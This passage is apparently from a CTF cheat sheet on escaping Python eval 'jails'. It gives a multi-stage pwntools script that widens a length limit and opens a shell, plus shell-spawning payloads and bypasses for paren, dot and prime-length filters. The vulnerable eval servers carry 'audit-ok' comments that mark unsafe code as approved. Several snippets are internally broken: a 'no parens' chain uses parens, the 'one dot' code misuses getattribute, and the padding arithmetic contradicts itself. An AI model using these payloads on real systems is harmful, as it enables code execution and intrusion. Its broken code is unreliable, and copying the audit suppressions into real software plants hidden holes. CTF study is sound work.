    if any(w in s for w in ("import", "os", "system", "exec", "eval", "compile")):
        return "blocked"
    return eval(s)  # <!-- audit-ok --> — intended as "safe" because M is small

while True:
    print(f(input(">>> ")))
```

**Idea:** `M=14` blocks `import os;os.system('sh')` outright, but `f` is itself exposed. Feed `f` a string that *returns* a longer string, then re-evaluate via `f(i())`.

**Triple `pwntools` script — `i=input;f(i())` → `M=99;f(i())` → `import os;os.system('sh')`:**

```python
from pwn import *

r = remote("jail.ctf", 1337)

# Stage 1: define shorthand and re-enter f with longer budget
# "i=input;f(i())" — len 12 ≤ 14, sets i=input and immediately re-prompts via f(i())
# Server does eval("i=input;f(i())") -> eval returns result of f(i())
# The inner i() reads the NEXT line from stdin as code
r.sendline(b"i=input;f(i())")  # Stage 1 payload, M=14 passes

# Stage 2: inside f(i()), send "M=99;f(i())" — this runs as eval("M=99;f(i())")
# Now M is 99, and we again trampoline via f(i()) with a larger limit
r.sendline(b"M=99;f(i())")    # Stage 2, re-uses same trick to widen M

# Stage 3: now we have 99 chars — enough for RCE
r.sendline(b"import os;os.system('sh')")
r.interactive()
# Alternative final payloads if import still filtered at stage 3:
#   __import__('os').system('sh')
#   breakpoint()  # unblocked -> pdb -> !import os; os.system('sh')
#   help()        # unblocked -> pager -> !sh
```

**Why `breakpoint`/`help` are RCE:** The filter blocklist in the challenge forgot `breakpoint` (enters `pdb`, which has `!` shell escape) and `help` (enters `pydoc` pager `less`/`more` with `!sh`). Both are unaudited code-execution primitives. The length-limit re-evaluation turns a 14-char jail into an unbounded one in two hops — the classic "filter'd" trick is that `f` itself is the oracle that lifts its own limit.

**Defensive note:** Never re-evaluate user input through the same `eval` path. If you must enforce a length limit, enforce it on the *original* input only and do not expose `f`/`eval`/`exec` as callable objects inside the evaluated namespace.

---

## Modern Filter Trio: impossible / one / primal

Three 2024–2026 jails that each allow only *one* narrow primitive. All bypasses use only the allowed primitive plus Python's data model.

### impossible — No `()` (parentheses banned)

**Filter:** `if "(" in code or ")" in code: block`. No calls, no tuples, no grouping.

**Bypass — `__getitem__` rebind:** Subscript `[]` is still allowed and triggers `__getitem__`. Rebind it to a callable, then "call" via `obj[args]`.

```python
# Server: eval(code) with "(" and ")" stripped, but [] and . allowed
# Goal: get shell without ever typing ()

# Step 1: Find a class whose __getitem__ we can overwrite
# list's __getitem__ is slot wrapper (read-only), but dict subclasses are mutable
class E(dict):
    pass

# Step 2: Rebind __getitem__ to exec/eval
E.__getitem__ = eval  # <!-- audit-ok --> — now E()["__import__('os').system('sh')"] would be a call, but we can't use ()
# Subscript form: E()["payload"] triggers eval("payload") with no parens
# But we still need to avoid () in payload itself — use [] form inside too

# Actual impossible payload (from writeup):
# Use __class_getitem__ / __getitem__ as call trampoline
#   import os via __loader__ trick without parens: use [] to invoke
# Minimal core:
#   ().__class__.__getitem__ = eval  — fails on tuple (immutable), so use a custom class
# Worked payload skeleton:
#   class X: __getitem__ = __import__('os').system  # via decorator trick
#   X()["sh"]  # subscript == call, no ()

# Full chain (no parens anywhere):
# Use decorator to rebind without = or () — see Decorator-Based Escape above
# Then:
#   obj = SomeClass()
#   obj["__import__('os').system('sh')"]  # triggers eval/system via __getitem__
```

**Key insight:** `obj[args]` is `type(obj).__getitem__(obj, args)` — a full call with no `()` in source. If the jail allows `[]` and attribute assignment (or decorator rebinding), `__getitem__` is a universal call gadget.

### one — One Dot (single `.` allowed)

**Filter:** `if code.count(".") != 1: block`. Exactly one dot in the entire payload.

**Bypass — `cache.__getattribute__` lambda:** Use the single dot to steal `__getattribute__`, then never need another dot.

```python
# Server: code.count(".") == 1, eval(code)

# The one dot: cache.__getattribute__ — from that we get a bound method
# that can fetch any attribute without further dots
#   cache = [1].__class__.__base__.subclasses()[...]  — but that needs dots
# Trick: the single dot IS the getattr primitive

# Payload skeleton (one dot total):
#   (lambda g: g("system")("sh"))(().__class__.__base__.__subclasses__()[...].__dict__["os"].__getattribute__)
# But we need to compress to one dot — real trick uses cache:

# From public writeup (simplified):
#   Use the one dot to get __getattribute__ from a known object that already has it
#   e.g. "".__getattribute__  — that's the one dot
#   Then use it as a function to fetch further attributes functionally:

# One-dot RCE (concept):
get = "".__getattribute__  # the single dot
# Now no more dots needed — use get(obj, "attr") instead of obj.attr
cls = get("", "__class__")
base = get(cls, "__base__")
subs = get(base, "__subclasses__")()
# ... find os / Popen and call via get(..., "__call__") or __getitem__ trick
```

**Why it works:** `object.__getattribute__` is the universal attribute fetch. One dot gives you the bound method; from there every `obj.attr` becomes `get(obj, "attr")` — a call with no dots. Combine with the `__getitem__` trick above to avoid further calls if `()` is also limited.

### primal — Prime Length (`len(code)` must be prime)

**Filter:** `if not is_prime(len(code)): block` and `eval(code)` with a small prime window (e.g. 2..101). Often combined with charset limits.

**Bypass — `reduce_ex` + hex escapes:** Pad to the next prime with comments/whitespace, then use hex escapes to smuggle arbitrary bytes without growing length uncontrollably.

```python
# Server:
def is_prime(n):
    return n > 1 and all(n % i for i in range(2, n))

while True:
    code = input(">>> ")
    if not is_prime(len(code)):
        print("length must be prime")
        continue
    eval(code)  # <!-- audit-ok -->
```

**Bypass strategy:**

```python
# 1. Build payload via hex escapes (\x6f\x73 -> "os") to keep charset minimal
# 2. Use reduce_ex / __reduce_ex__ as call gadget if () is limited
# 3. Pad to prime with "# comment" or " ;pass" — comments don't affect semantics

# Example: want `__import__('os').system('sh')` but need prime length
payload = "__import__('\\x6f\\x73').system('\\x73\\x68')"
# len(payload) = 38 (not prime) -> pad to 41 (prime)
payload_padded = payload + " #aaa"  # 38+4=42 still not prime, try 41
# Brute force padding:
for pad in range(20):
    cand = payload + " " + "#" * pad
    if is_prime(len(cand)):
        print(cand, len(cand))
        break

# Alternative primal trick: use `1 .__reduce_ex__(2)` style to get code execution
# via pickle reduce without import, then hex-escape the pickle bytes
#   b"\x80\x04\x95..." -> payload via "\x80\x04..." string
```

**Key insight:** A prime-length check is not a security boundary — it is just a padding puzzle. Comments (`#`), semicolons, whitespace, and hex escapes (`\x41`) let you hit any prime in the allowed window without changing semantics. Combine with `__getitem__`/`__getattribute__` gadgets above to handle any additional filter the primal challenge layers on.

**References:** PlaidCTF 2024 `impossible`/`one`/`primal` trio; JailCTF 2024 `filter'd`; ImaginaryCTF 2024 `calc`; DiceCTF 2023 `IRS`
